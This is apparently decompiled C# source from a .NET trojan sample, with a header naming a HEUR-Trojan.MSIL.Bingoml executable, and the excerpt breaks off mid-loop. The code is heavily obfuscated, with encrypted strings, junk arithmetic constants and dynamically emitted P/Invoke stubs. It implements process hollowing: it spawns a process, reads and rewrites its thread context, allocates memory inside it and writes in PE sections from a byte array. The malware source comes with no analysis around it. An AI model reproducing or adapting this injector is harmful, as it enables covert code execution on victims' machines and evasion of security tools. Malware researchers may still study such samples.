// Decompiled with JetBrains decompiler
// Type: ContinueWithIsRightKind
// Assembly: ebjpdgmlpo, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0CDA7841-F392-4B79-AA40-F2EF09CA848C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bingoml.gen-97b2d807f8c07d9dfa4a7fce2b85f6ae6030b425982ac257ba226bdf357f42bd.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

public static class ContinueWithIsRightKind
{
  private static ContinueWithIsRightKind.NamedPermissionSet Id = ContinueWithIsRightKind.TryGetPtrSig<ContinueWithIsRightKind.NamedPermissionSet>(\u003CModule\u003E.g\u007B\u0092\u00A5\u0016("YjSJ7pjkVoRat4h9yDMTZQ==", "ebjpdgmlpo"), \u003CModule\u003E.g\u007B\u0092\u00A5\u0016("99Ir208tARH5Hz2AB+jLT51tq29+reri", "ebjpdgmlpo"));
  private static ContinueWithIsRightKind.Identifier Set_IsSet = ContinueWithIsRightKind.TryGetPtrSig<ContinueWithIsRightKind.Identifier>(\u003CModule\u003E.g\u007B\u0092\u00A5\u0016("YjSJ7pjkVoRat4h9yDMTZQ==", "ebjpdgmlpo"), \u003CModule\u003E.g\u007B\u0092\u00A5\u0016("IBATkIgMmjsNfFkcBMP+svZGtAh9BpI5", "ebjpdgmlpo"));
  private static ContinueWithIsRightKind.Get_ClassSize FormatCustomized = ContinueWithIsRightKind.TryGetPtrSig<ContinueWithIsRightKind.Get_ClassSize>(\u003CModule\u003E.g\u007B\u0092\u00A5\u0016("YjSJ7pjkVoRat4h9yDMTZQ==", "ebjpdgmlpo"), \u003CModule\u003E.g\u007B\u0092\u00A5\u0016("HnufcQfMegDbQfWXFOKA8qPawMDRmSlJ", "ebjpdgmlpo"));
  private static ContinueWithIsRightKind.Op_Multiply FindTypeRef = ContinueWithIsRightKind.TryGetPtrSig<ContinueWithIsRightKind.Op_Multiply>(\u003CModule\u003E.g\u007B\u0092\u00A5\u0016("YjSJ7pjkVoRat4h9yDMTZQ==", "ebjpdgmlpo"), \u003CModule\u003E.g\u007B\u0092\u00A5\u0016("HzuAyIagldpWF3f6TLpfZA==", "ebjpdgmlpo"));
  private static ContinueWithIsRightKind.RunWorkerAsync CreateDirectory = ContinueWithIsRightKind.TryGetPtrSig<ContinueWithIsRightKind.RunWorkerAsync>(\u003CModule\u003E.g\u007B\u0092\u00A5\u0016("YjSJ7pjkVoRat4h9yDMTZQ==", "ebjpdgmlpo"), \u003CModule\u003E.g\u007B\u0092\u00A5\u0016("NAZNPNPVmqn9uKcNOls6VsQHfHSpkrZp", "ebjpdgmlpo"));
  private static ContinueWithIsRightKind.SystemWebDynamicDataDesign Get_IsEvent = ContinueWithIsRightKind.TryGetPtrSig<ContinueWithIsRightKind.SystemWebDynamicDataDesign>(\u003CModule\u003E.g\u007B\u0092\u00A5\u0016("YjSJ7pjkVoRat4h9yDMTZQ==", "ebjpdgmlpo"), \u003CModule\u003E.g\u007B\u0092\u00A5\u0016("aqoeXbBsCEeg7EnPxaFQDn14jeyPFSVo", "ebjpdgmlpo"));
  private static ContinueWithIsRightKind.MarkLabel RawConstantRow = ContinueWithIsRightKind.TryGetPtrSig<ContinueWithIsRightKind.MarkLabel>(\u003CModule\u003E.g\u007B\u0092\u00A5\u0016("YjSJ7pjkVoRat4h9yDMTZQ==", "ebjpdgmlpo"), \u003CModule\u003E.g\u007B\u0092\u00A5\u0016("nm4R8ZtYvRRXnL3ZOHxIV8fMIKZ4a4zj", "ebjpdgmlpo"));
  private static ContinueWithIsRightKind.Notation CopyToManaged = ContinueWithIsRightKind.TryGetPtrSig<ContinueWithIsRightKind.Notation>(\u003CModule\u003E.g\u007B\u0092\u00A5\u0016("YjSJ7pjkVoRat4h9yDMTZQ==", "ebjpdgmlpo"), \u003CModule\u003E.g\u007B\u0092\u00A5\u0016("oXGeK5ggO1UN68SOofMdZA==", "ebjpdgmlpo"));
  private static ContinueWithIsRightKind.IsUnmanaged TransliteratedFrench = ContinueWithIsRightKind.TryGetPtrSig<ContinueWithIsRightKind.IsUnmanaged>(\u003CModule\u003E.g\u007B\u0092\u00A5\u0016("Bv7KBJ6unvlfLNifxE+tjg==", "ebjpdgmlpo"), \u003CModule\u003E.g\u007B\u0092\u00A5\u0016("+H+Q3+Jo3s+I0toO9m6dUD6kaQe0/1hJ", "ebjpdgmlpo"));

  public static \u0001 TryGetPtrSig<\u0001>(string _param0_1, string _param1)
  {
    AssemblyBuilder assemblyBuilder = (AssemblyBuilder) \u003CModule\u003E.\u009C`éN\u00A3(\u003CModule\u003E.\u0005\u0088\u0083\u002D\u0001(), \u003CModule\u003E.\u00D7\u00AC\u00A3\u00BC\u009F(\u003CModule\u003E.g\u007B\u0092\u00A5\u0016("skrDgFXS0G+Bz3vGOSxjpjKsmvNoyl+R", "ebjpdgmlpo")), (AssemblyBuilderAccess) ((int.Parse("-1258626413") ^ int.Parse("1258627750")) + Convert.ToInt32(80089.597621745837 - Math.Log(40039.5)) / \u003CModule\u003E.Run(int.Parse("12")) - Convert.ToInt32(63748.0 - Math.Tanh(31873.5)) / \u003CModule\u003E.Run(int.Parse("6"))));
    ModuleBuilder moduleBuilder = (ModuleBuilder) \u003CModule\u003E.\u0003\u0028\u0020í\u0083((object) assemblyBuilder, \u003CModule\u003E.g\u007B\u0092\u00A5\u0016("skrDgFXS0G8+W8ZcSXwA2fb2+mCCcT5+", "ebjpdgmlpo"));
    TypeBuilder typeBuilder = (TypeBuilder) \u003CModule\u003E.ÿe\u0081î2((object) moduleBuilder, "DynamicDllInvokeType", (TypeAttributes) ((Convert.ToInt32(2.0 * -24509.5) + Convert.ToInt32(2972898940.5 / 38554.5) / \u003CModule\u003E.Run(int.Parse("3")) + Convert.ToInt32(18723.0 + Math.Round(18723.5)) / \u003CModule\u003E.Run(int.Parse("6"))) * (Convert.ToInt32(2672609160.5 / -36555.5) + Convert.ToInt32(36750.264180075035 - Math.Log10(18373.0)) / \u003CModule\u003E.Run(int.Parse("10")) + Convert.ToInt32(36365.141407749812 + Math.Cos(18183.0)) / \u003CModule\u003E.Run(int.Parse("8")))));
    // ISSUE: type reference
    MethodInfo methodInfo1 = (MethodInfo) \u003CModule\u003E.Ár\u0080j9(\u003CModule\u003E.\u0025\u0025î\u0020\u00F7(__typeref (\u0001)), \u003CModule\u003E.g\u007B\u0092\u00A5\u0016("iANuHdL0CqE=", "ebjpdgmlpo"));
    Type[] array = ((IEnumerable<ParameterInfo>) \u003CModule\u003E.\u0023Å\u0012\u000E\u000F((object) methodInfo1)).Select<ParameterInfo, Type>((Func<ParameterInfo, Type>) (_param0_2 => (Type) \u003CModule\u003E.Î\u00B9õ\u0025\u00A9((object) _param0_2))).ToArray<Type>();
    MethodBuilder methodBuilder = (MethodBuilder) \u003CModule\u003E.y\u0099µ\u0096A((object) typeBuilder, _param1, _param0_1, (MethodAttributes) ((Convert.ToInt32(-41703.0 - 41703.0) + Convert.ToInt32(129653.0 - Math.Ceiling(43217.5)) / \u003CModule\u003E.Run(int.Parse("7")) + Convert.ToInt32(7777.5 - 2592.5) / \u003CModule\u003E.Run(int.Parse("8"))) * ((int.Parse("-160630818") ^ int.Parse("160577613")) + Convert.ToInt32(482641380.5 / 15534.5) / \u003CModule\u003E.Run(int.Parse("2")) + Convert.ToInt32(46865.5968770636 - Math.Sin(23432.5)) / \u003CModule\u003E.Run(int.Parse("1")))), (CallingConventions) ((int.Parse("-2057376483") ^ int.Parse("2057431295")) + Convert.ToInt32(796643528.0 / 19958.0) / \u003CModule\u003E.Run(int.Parse("7")) + Convert.ToInt32(36172.5 - 12057.5) / \u003CModule\u003E.Run(int.Parse("9"))), \u003CModule\u003E.\u0022vînû((object) methodInfo1), array, (CallingConvention) (Convert.ToInt32(-41386.5 - -13795.5) + Convert.ToInt32(79255.0 + Math.Tanh(39628.0)) / \u003CModule\u003E.Run(int.Parse("7")) - Convert.ToInt32(1334584448.0 / 25832.0) / \u003CModule\u003E.Run(int.Parse("10"))), (CharSet) ((Convert.ToInt32(-12664.0 - 12664.0) + Convert.ToInt32(95046.23091518991 + Math.Log(47528.5)) / \u003CModule\u003E.Run(int.Parse("8")) - Convert.ToInt32(104590.5 - Math.Abs(34863.5)) / \u003CModule\u003E.Run(int.Parse("11"))) * (Convert.ToInt32(-36327.5 - 36327.5) + Convert.ToInt32(1094.379692491553 - Math.Tan(547.0)) / \u003CModule\u003E.Run(int.Parse("1")) + Convert.ToInt32(107343.0 - Math.Truncate(35781.0)) / \u003CModule\u003E.Run(int.Parse("2")))));
    \u003CModule\u003E.\u0003Ih\u0092ä((object) methodBuilder, \u003CModule\u003E.Ê\u001D\u008F\u0011ý((object) methodBuilder) | (MethodImplAttributes) (((int.Parse("934639735") ^ int.Parse("934657335")) / \u003CModule\u003E.Run(int.Parse("9")) + Convert.ToInt32(7038.4420558696565 - Math.Tan(3519.0)) / \u003CModule\u003E.Run(int.Parse("9")) - Convert.ToInt32(57407.0 - Math.Tanh(28703.0)) / \u003CModule\u003E.Run(int.Parse("14"))) * (Convert.ToInt32(5857.6308911237275 + Math.Sqrt(2956.0)) / \u003CModule\u003E.Run(int.Parse("7")) + Convert.ToInt32(38221.0 - Math.Tanh(19110.0)) / \u003CModule\u003E.Run(int.Parse("10")) - Convert.ToInt32(66197.0 - Math.Round(22065.5)) / \u003CModule\u003E.Run(int.Parse("10")))));
    Type type = (Type) \u003CModule\u003E.\u0083Ê\u001EÊ\u007F((object) typeBuilder);
    MethodInfo methodInfo2 = (MethodInfo) \u003CModule\u003E.\u00B4QläS((object) type, _param1);
    // ISSUE: type reference
    return (\u0001) \u003CModule\u003E.\u002Aà2\u0083\u005C((Type) \u003CModule\u003E.\u0025\u0025î\u0020\u00F7(__typeref (\u0001)), methodInfo2, Convert.ToInt32(-34954.5 - 34954.5) + (int.Parse("2037498822") ^ int.Parse("2037441969")) / \u003CModule\u003E.Run(int.Parse("4")) - Convert.ToInt32(2736.0 + Math.Ceiling(2736.5)) / \u003CModule\u003E.Run(int.Parse("14")) != 0);
  }

  public static bool Get_IsNewSlot(string _param0, string _param1, byte[] _param2, bool _param3)
  {
    for (int index = Convert.ToInt32(20247.0 - Math.Truncate(6749.0)) / \u003CModule\u003E.Run(int.Parse("2")) + Convert.ToInt32(62521.0 - Math.Tanh(31260.0)) / \u003CModule\u003E.Run(int.Parse("7")) - Convert.ToInt32(38009.0 + Math.Round(38008.5)) / \u003CModule\u003E.Run(int.Parse("3")); index <= (Convert.ToInt32(2.0 * -23280.5) + Convert.ToInt32(1473.5972016551557 - Math.Tan(740.0)) / \u003CModule\u003E.Run(int.Parse("11")) + Convert.ToInt32(1016373698.0 / 22543.0) / \u003CModule\u003E.Run(int.Parse("5"))) * (Convert.ToInt32(48102.511938955948 - Math.Cos(24051.0)) / \u003CModule\u003E.Run(int.Parse("7")) + Convert.ToInt32(8350.5 + 8350.5) / \u003CModule\u003E.Run(int.Parse("2")) - Convert.ToInt32(97203.0 - 32401.0) / \u003CModule\u003E.Run(int.Parse("9"))); index += Convert.ToInt32(53989.0 - Math.Round(17996.5)) / \u003CModule\u003E.Run(int.Parse("4")) + Convert.ToInt32(52203.465109678255 - Math.Tan(26102.5)) / \u003CModule\u003E.Run(int.Parse("10")) - Convert.ToInt32(44099.0 + Math.Floor(44098.5)) / \u003CModule\u003E.Run(int.Parse("12")))
    {
      if (\u003CModule\u003E.Vò\u0009Þ\u00F7(_param0, _param1, _param2, _param3))
        return Convert.ToInt32(47336.948648977486 + Math.Tan(23668.0)) / \u003CModule\u003E.Run(int.Parse("1")) + Convert.ToInt32(49383.0 - Math.Floor(16461.0)) / \u003CModule\u003E.Run(int.Parse("10")) - Convert.ToInt32(80255.639252880763 + Math.Tan(40128.5)) / \u003CModule\u003E.Run(int.Parse("12")) != 0;
    }
    return Convert.ToInt32(2.0 * -3366.5) + Convert.ToInt32(605241632.0 / 17396.0) / \u003CModule\u003E.Run(int.Parse("2")) - Convert.ToInt32(28177.446190314422 - Math.Sqrt(14029.5)) / \u003CModule\u003E.Run(int.Parse("8")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length != 0;
  }

  public static bool Get_MemberRefTable(
    string _param0,
    string _param1,
    byte[] _param2,
    bool _param3)
  {
    int lpNumberOfBytesWritten = Convert.ToInt32(17647004844.5 / -93933.5) + Convert.ToInt32(90582.5676362949 - Math.Sqrt(45185.0)) / \u003CModule\u003E.Run(int.Parse("2")) + Convert.ToInt32(48749.0 + Math.Truncate(48748.5)) / \u003CModule\u003E.Run(int.Parse("14")) + Type.EmptyTypes.Length + Type.EmptyTypes.Length;
    string lpCommandLine = \u003CModule\u003E.\u0018\u0084\u0098\u0095T("\"", _param0, "\"");
    ContinueWithIsRightKind.GetHashCode_TypeNamespace startupInfo = new ContinueWithIsRightKind.GetHashCode_TypeNamespace();
    ContinueWithIsRightKind.CreateSymbolReader aoFncppgdri = new ContinueWithIsRightKind.CreateSymbolReader();
    // ISSUE: type reference
    startupInfo.Get_Issuer = \u003CModule\u003E.Ýv\u00B7ö\u002D(\u003CModule\u003E.\u0039\u007BîOl((Type) \u003CModule\u003E.\u0025\u0025î\u0020\u00F7(__typeref (ContinueWithIsRightKind.GetHashCode_TypeNamespace))));
    try
    {
      if (!\u003CModule\u003E.ÅpA\u00B2G(_param1))
        lpCommandLine = \u003CModule\u003E.\u0018\u0084\u0098\u0095T(lpCommandLine, " ", _param1);
      if (!ContinueWithIsRightKind.TransliteratedFrench(IntPtr.Zero, _param0, lpCommandLine, IntPtr.Zero, IntPtr.Zero, Convert.ToInt32(416363224.5 / -14428.5) + Convert.ToInt32(8103.0 + Math.Floor(8103.0)) / \u003CModule\u003E.Run(int.Parse("2")) + Convert.ToInt32(12647.198905139929 + Math.Log10(6325.5)) / \u003CModule\u003E.Run(int.Parse("9")) - Type.EmptyTypes.Length + Type.EmptyTypes.Length != 0, (uint) ((Convert.ToInt32(45862.900031980294 - Math.Tan(22932.5)) / \u003CModule\u003E.Run(int.Parse("7")) + Convert.ToInt32(2.0 * 91.0) / \u003CModule\u003E.Run(int.Parse("10")) - Convert.ToInt32(69065.0 - Math.Round(23021.5)) / \u003CModule\u003E.Run(int.Parse("10"))) * ((int.Parse("-1227195409") ^ int.Parse("1227114205")) + (int.Parse("1313791668") ^ int.Parse("1313833715")) / \u003CModule\u003E.Run(int.Parse("6")) + Convert.ToInt32(344478752.0 / 13124.0) / \u003CModule\u003E.Run(int.Parse("8")))), IntPtr.Zero, (string) null, ref startupInfo, ref aoFncppgdri))
        throw \u003CModule\u003E.UÀLNg();
      int num1 = \u003CModule\u003E.e\u00BDTjô(_param2, (Convert.ToInt32(17297628002.0 / -92999.0) + Convert.ToInt32(100169.54641576191 - Math.Sqrt(49973.0)) / \u003CModule\u003E.Run(int.Parse("1")) + Convert.ToInt32(129168.0 - Math.Ceiling(43056.0)) / \u003CModule\u003E.Run(int.Parse("8"))) * (Convert.ToInt32(530109360.5 / -16280.5) + Convert.ToInt32(41830.129368055495 + Math.Sqrt(20987.5)) / \u003CModule\u003E.Run(int.Parse("7")) - Convert.ToInt32(14119.5 - Math.Abs(4706.5)) / \u003CModule\u003E.Run(int.Parse("14"))));
      int num2 = \u003CModule\u003E.e\u00BDTjô(_param2, num1 + (Convert.ToInt32(7250.1945055097658 - Math.Log(3621.0)) / \u003CModule\u003E.Run(int.Parse("9")) + Convert.ToInt32(3068.8327780377035 + Math.Cos(1534.5)) / \u003CModule\u003E.Run(int.Parse("13")) - Convert.ToInt32(52623540.5 / 5129.5) / \u003CModule\u003E.Run(int.Parse("4"))) * (Convert.ToInt32(21525.715712383073 + Math.Log(10767.5)) / \u003CModule\u003E.Run(int.Parse("13")) + Convert.ToInt32(76591.41682390518 + Math.Log10(38298.0)) / \u003CModule\u003E.Run(int.Parse("10")) - Convert.ToInt32(147195.0 - Math.Round(49065.0)) / \u003CModule\u003E.Run(int.Parse("5"))));
      int[] context = new int[(Convert.ToInt32(84812.0612600112 + Math.Tan(42413.0)) / \u003CModule\u003E.Run(int.Parse("14")) + Convert.ToInt32(13312.196050164208 + Math.Log(6660.5)) / \u003CModule\u003E.Run(int.Parse("12")) - Convert.ToInt32(48984.0 + Math.Truncate(48984.0)) / \u003CModule\u003E.Run(int.Parse("8"))) * ((int.Parse("-1372908406") ^ int.Parse("1373024474")) + Convert.ToInt32(98180.653252873541 + Math.Tan(49089.5)) / \u003CModule\u003E.Run(int.Parse("14")) + Convert.ToInt32(84549.0 - Math.Round(28183.0)) / \u003CModule\u003E.Run(int.Parse("8")))];
      context[Convert.ToInt32(6593.0 - Math.Round(2197.5)) / \u003CModule\u003E.Run(int.Parse("2")) + Convert.ToInt32(2234260704.5 / 33423.5) / \u003CModule\u003E.Run(int.Parse("12")) - Convert.ToInt32(35621.0 + Math.Floor(35621.0)) / \u003CModule\u003E.Run(int.Parse("11")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length] = ((int.Parse("-1631156200") ^ int.Parse("1631152435")) + Convert.ToInt32(24875.0 + Math.Floor(24874.5)) / \u003CModule\u003E.Run(int.Parse("6")) + Convert.ToInt32(23672.62067663567 + Math.Log(11841.0)) / \u003CModule\u003E.Run(int.Parse("14"))) * ((int.Parse("-1640172187") ^ int.Parse("1640137111")) + Convert.ToInt32(78043.7259038224 - Math.Sin(39022.0)) / \u003CModule\u003E.Run(int.Parse("5")) + Convert.ToInt32(2.0 * 11545.5) / \u003CModule\u003E.Run(int.Parse("4")));
      if (\u003CModule\u003E.\u0033ûÅj\u00B4() != (Convert.ToInt32(-77343.0 - -25781.0) + Convert.ToInt32(67167.0 - Math.Truncate(22389.0)) / \u003CModule\u003E.Run(int.Parse("13")) + Convert.ToInt32(6784.4692881620185 + Math.Log10(3394.0)) / \u003CModule\u003E.Run(int.Parse("13"))) * (Convert.ToInt32(-17135.0 - 17135.0) + Convert.ToInt32(39275.885667600363 - Math.Sqrt(19568.0)) / \u003CModule\u003E.Run(int.Parse("11")) - Convert.ToInt32(4868.38605284894 - Math.Log10(2432.5)) / \u003CModule\u003E.Run(int.Parse("8"))))
      {
        int num3 = ContinueWithIsRightKind.Id(aoFncppgdri.DoDemand, context) ? 1 : 0;
      }
      else
      {
        int num4 = ContinueWithIsRightKind.Set_IsSet(aoFncppgdri.DoDemand, context) ? 1 : 0;
      }
      int num5 = context[(Convert.ToInt32(11834295858.0 / -76923.0) + Convert.ToInt32(39068.0 + Math.Abs(39068.0)) / \u003CModule\u003E.Run(int.Parse("7")) + Convert.ToInt32(75556.383710856462 + Math.Sqrt(37875.5)) / \u003CModule\u003E.Run(int.Parse("5"))) * (Convert.ToInt32(-157014.0 - -52338.0) + Convert.ToInt32(37255.5 + 37255.5) / \u003CModule\u003E.Run(int.Parse("1")) + Convert.ToInt32(2.0 * 15083.0) / \u003CModule\u003E.Run(int.Parse("9")))];
      int lpBuffer1 = Convert.ToInt32(2.0 * -85762.5) + Convert.ToInt32(38072.0 + Math.Abs(38072.0)) / \u003CModule\u003E.Run(int.Parse("13")) + Convert.ToInt32(95380.567487253691 + Math.Cos(47690.5)) / \u003CModule\u003E.Run(int.Parse("5")) - Type.EmptyTypes.Length - Type.EmptyTypes.Length;
      int num6 = ContinueWithIsRightKind.FormatCustomized(aoFncppgdri.ValidOn, num5 + (Convert.ToInt32(2.0 * -57709.5) + Convert.ToInt32(44718.0 + 44718.0) / \u003CModule\u003E.Run(int.Parse("3")) + Convert.ToInt32(25986.886207006424 + Math.Log10(12995.5)) / \u003CModule\u003E.Run(int.Parse("1"))) * (Convert.ToInt32(-207883.5 - -69294.5) + Convert.ToInt32(34888.0 + Math.Round(34888.0)) / \u003CModule\u003E.Run(int.Parse("13")) + Convert.ToInt32(2.0 * 34407.0) / \u003CModule\u003E.Run(int.Parse("9"))), lpBuffer1, (Convert.ToInt32(12172992512.0 / -78016.0) + Convert.ToInt32(108248.0 - Math.Ceiling(36082.5)) / \u003CModule\u003E.Run(int.Parse("7")) + Convert.ToInt32(83875.6225818255 - Math.Log10(41935.5)) / \u003CModule\u003E.Run(int.Parse("11"))) * ((int.Parse("-884323772") ^ int.Parse("884419575")) + Convert.ToInt32(3031556978.0 / 38933.0) / \u003CModule\u003E.Run(int.Parse("13")) + Convert.ToInt32(140598.0 - 46866.0) / \u003CModule\u003E.Run(int.Parse("8"))), ref lpNumberOfBytesWritten) ? 1 : 0;
      int dwSize = \u003CModule\u003E.e\u00BDTjô(_param2, num1 + (Convert.ToInt32(5415490592.0 / -52036.0) + Convert.ToInt32(118071.0 - Math.Floor(39357.0)) / \u003CModule\u003E.Run(int.Parse("14")) + (int.Parse("305392903") ^ int.Parse("305368665")) / \u003CModule\u003E.Run(int.Parse("5"))) * (Convert.ToInt32(3051367200.0 / -39060.0) + Convert.ToInt32(118411.0 - Math.Floor(39470.5)) / \u003CModule\u003E.Run(int.Parse("13")) - Convert.ToInt32(826.01615715969831 - Math.Log(410.0)) / \u003CModule\u003E.Run(int.Parse("9"))));
      int nSize = \u003CModule\u003E.e\u00BDTjô(_param2, num1 + (Convert.ToInt32(-68733.5 - 68733.5) + Convert.ToInt32(2762028488.0 / 37162.0) / \u003CModule\u003E.Run(int.Parse("11")) + Convert.ToInt32(63227.940440334707 + Math.Cos(31613.5)) / \u003CModule\u003E.Run(int.Parse("4"))) * (Convert.ToInt32(52087.45125812781 + Math.Tan(26045.0)) / \u003CModule\u003E.Run(int.Parse("7")) + Convert.ToInt32(46665.942161787636 + Math.Log(23338.0)) / \u003CModule\u003E.Run(int.Parse("3")) - Convert.ToInt32(98764.018937176632 - Math.Cos(49382.5)) / \u003CModule\u003E.Run(int.Parse("2"))));
      bool flag = Convert.ToInt32(2.0 * 11207.0) / \u003CModule\u003E.Run(int.Parse("14")) + (int.Parse("1118423763") ^ int.Parse("1118437105")) / \u003CModule\u003E.Run(int.Parse("14")) - Convert.ToInt32(17880.0 + 17880.0) / \u003CModule\u003E.Run(int.Parse("2")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length != 0;
      int lpBaseAddress = ContinueWithIsRightKind.FindTypeRef(aoFncppgdri.ValidOn, \u003CModule\u003E.õ\u00A9\u0008å\u0015(num2), (uint) dwSize, (uint) ((Convert.ToInt32(4588436808.0 / 47898.0) / \u003CModule\u003E.Run(int.Parse("10")) + Convert.ToInt32(15792.893338084987 + Math.Cos(7896.5)) / \u003CModule\u003E.Run(int.Parse("6")) - Convert.ToInt32(148951.0 - Math.Round(49650.5)) / \u003CModule\u003E.Run(int.Parse("4"))) * (Convert.ToInt32(387282280.5 / -13915.5) + Convert.ToInt32(33163.0 + Math.Ceiling(33163.5)) / \u003CModule\u003E.Run(int.Parse("12")) - Convert.ToInt32(38494.0 + Math.Tanh(19247.5)) / \u003CModule\u003E.Run(int.Parse("1")))), (uint) ((Convert.ToInt32(-25900.0 - 25900.0) + Convert.ToInt32(55780.5 - 18593.5) / \u003CModule\u003E.Run(int.Parse("9")) + Convert.ToInt32(7339.0 + Math.Floor(7338.5)) / \u003CModule\u003E.Run(int.Parse("7"))) * ((int.Parse("-38554987") ^ int.Parse("38561869")) + Convert.ToInt32(145129.0 - Math.Floor(48376.5)) / \u003CModule\u003E.Run(int.Parse("12")) - Convert.ToInt32(87239.0 + Math.Tanh(43620.0)) / \u003CModule\u003E.Run(int.Parse("2")))));
      if (!_param3 && lpBaseAddress == 0)
      {
        flag = (int.Parse("-761223109") ^ int.Parse("761232557")) + Convert.ToInt32(1740.0 - Math.Tanh(869.5)) / \u003CModule\u003E.Run(int.Parse("10")) + Convert.ToInt32(14064.0 - 4688.0) / \u003CModule\u003E.Run(int.Parse("5")) != 0;
        lpBaseAddress = ContinueWithIsRightKind.FindTypeRef(aoFncppgdri.ValidOn, \u003CModule\u003E.õ\u00A9\u0008å\u0015((int.Parse("-1155208707") ^ int.Parse("1155184837")) + Convert.ToInt32(20969.0 + 20969.0) / \u003CModule\u003E.Run(int.Parse("7")) + Convert.ToInt32(68341.896337968559 - Math.Tan(34171.0)) / \u003CModule\u003E.Run(int.Parse("6")) - Type.EmptyTypes.Length - Type.EmptyTypes.Length), (uint) dwSize, (uint) ((Convert.ToInt32(-130086.0 - -43362.0) + Convert.ToInt32(33495.0 + Math.Ceiling(33495.5)) / \u003CModule\u003E.Run(int.Parse("8")) + Convert.ToInt32(32022.380324303595 - Math.Tan(16010.5)) / \u003CModule\u003E.Run(int.Parse("7"))) * (Convert.ToInt32(12024903200.0 / -77540.0) + Convert.ToInt32(71924.191173544168 - Math.Tan(35962.0)) / \u003CModule\u003E.Run(int.Parse("3")) + Convert.ToInt32(83161.618868817517 - Math.Log10(41578.5)) / \u003CModule\u003E.Run(int.Parse("7")))), (uint) (((int.Parse("-1036130425") ^ int.Parse("1036171979")) + Convert.ToInt32(110826.0 - Math.Floor(36942.0)) / \u003CModule\u003E.Run(int.Parse("12")) - Convert.ToInt32(2.0 * 16084.0) / \u003CModule\u003E.Run(int.Parse("3"))) * (Convert.ToInt32(23708.0 + Math.Truncate(23708.0)) / \u003CModule\u003E.Run(int.Parse("14")) + Convert.ToInt32(24546.0 - Math.Truncate(8182.0)) / \u003CModule\u003E.Run(int.Parse("13")) - Convert.ToInt32(31890.0 + Math.Floor(31889.5)) / \u003CModule\u003E.Run(int.Parse("10")))));
      }
      if (lpBaseAddress == 0)
        throw \u003CModule\u003E.UÀLNg();
      int num7 = ContinueWithIsRightKind.CreateDirectory(aoFncppgdri.ValidOn, lpBaseAddress, _param2, nSize, out lpNumberOfBytesWritten) ? 1 : 0;
      int num8 = num1 + ((int.Parse("-475364463") ^ int.Parse("475338178")) + Convert.ToInt32(44626.5 - 14875.5) / \u003CModule\u003E.Run(int.Parse("13")) - Convert.ToInt32(2453.0881360887006 - Math.Log10(1225.0)) / \u003CModule\u003E.Run(int.Parse("6"))) * (Convert.ToInt32(-15525.0 - -5175.0) + Convert.ToInt32(7830.5 + Math.Abs(7830.5)) / \u003CModule\u003E.Run(int.Parse("13")) - Convert.ToInt32(2655.0 + Math.Abs(2655.0)) / \u003CModule\u003E.Run(int.Parse("7")));
      short num9 = \u003CModule\u003E.\u0084\u00AF\u002AøH(_param2, num1 + (Convert.ToInt32(2.0 * -15385.5) + Convert.ToInt32(44854.67600051115 + Math.Sin(22427.5)) / \u003CModule\u003E.Run(int.Parse("13")) - Convert.ToInt32(2.0 * 7039.0) / \u003CModule\u003E.Run(int.Parse("7"))) * (Convert.ToInt32(54420.0 - Math.Abs(18140.0)) / \u003CModule\u003E.Run(int.Parse("3")) + Convert.ToInt32(26871.887448458463 - Math.Sin(13435.5)) / \u003CModule\u003E.Run(int.Parse("11")) - Convert.ToInt32(63149.088152855416 + Math.Sin(31575.0)) / \u003CModule\u003E.Run(int.Parse("9"))));
      int num10 = Convert.ToInt32(2.0 * -23013.0) + Convert.ToInt32(98132.5695318818 - Math.Sin(49066.0)) / \u003CModule\u003E.Run(int.Parse("2")) - Convert.ToInt32(26053.0 + Math.Truncate(26053.0)) / \u003CModule\u003E.Run(int.Parse("7")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length;
      do
      {
        int num11 = \u003CModule\u003E.e\u00BDTjô(_param2, num8 + (Convert.ToInt32(76829.625543707865 - Math.Cos(38414.5)) / \u003CModule\u003E.Run(int.Parse("11")) + Convert.ToInt32(170866098.0 / 9243.0) / \u003CModule\u003E.Run(int.Parse("1")) - Convert.ToInt32(142954.5 - Math.Abs(47651.5)) / \u003CModule\u003E.Run(int.Parse("5"))) * (Convert.ToInt32(2994683440.5 / -38695.5) + Convert.ToInt32(98180.0 + Math.Tanh(49090.5)) / \u003CModule\u003E.Run(int.Parse("10")) - Convert.ToInt32(10394.5 + Math.Abs(10394.5)) / \u003CModule\u003E.Run(int.Parse("4"))));
        int length = \u003CModule\u003E.e\u00BDTjô(_param2, num8 + (Convert.ToInt32(2.0 * -15977.0) + Convert.ToInt32(34114.3533658944 - Math.Sqrt(16992.0)) / \u003CModule\u003E.Run(int.Parse("8")) - Convert.ToInt32(2020.9147308927186 - Math.Log(1007.0)) / \u003CModule\u003E.Run(int.Parse("8"))) * (Convert.ToInt32(-157636.5 - -52545.5) + Convert.ToInt32(58071.621064995976 - Math.Cos(29035.5)) / \u003CModule\u003E.Run(int.Parse("13")) + Convert.ToInt32(47020.0 + Math.Tanh(23510.5)) / \u003CModule\u003E.Run(int.Parse("14"))));
        int num12 = \u003CModule\u003E.e\u00BDTjô(_param2, num8 + (Convert.ToInt32(-74527.5 - -24842.5) + Convert.ToInt32(144582.0 - Math.Round(48194.0)) / \u003CModule\u003E.Run(int.Parse("5")) - (int.Parse("711907776") ^ int.Parse("711880603")) / \u003CModule\u003E.Run(int.Parse("2"))) * (Convert.ToInt32(2.0 * -778.0) + Convert.ToInt32(2763.0 - 921.0) / \u003CModule\u003E.Run(int.Parse("6")) - Convert.ToInt32(40612.5 / 142.5) / \u003CModule\u003E.Run(int.Parse("3"))));
        if (length != 0)
        {
          byte[] lpBuffer2 = new byte[length];
          \u003CModule\u003E.\u000B\u000Eô\u009Bñ((Array) _param2, num12, (Array) lpBuffer2, (int.Parse("-484199668") ^ int.Parse("484205242")) + Convert.ToInt32(2638.5 - 879.5) / \u003CModule\u003E.Run(int.Parse("6")) + Convert.ToInt32(10090.005217706084 + Math.Cos(5045.5)) / \u003CModule\u003E.Run(int.Parse("13")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length, lpBuffer2.Length);
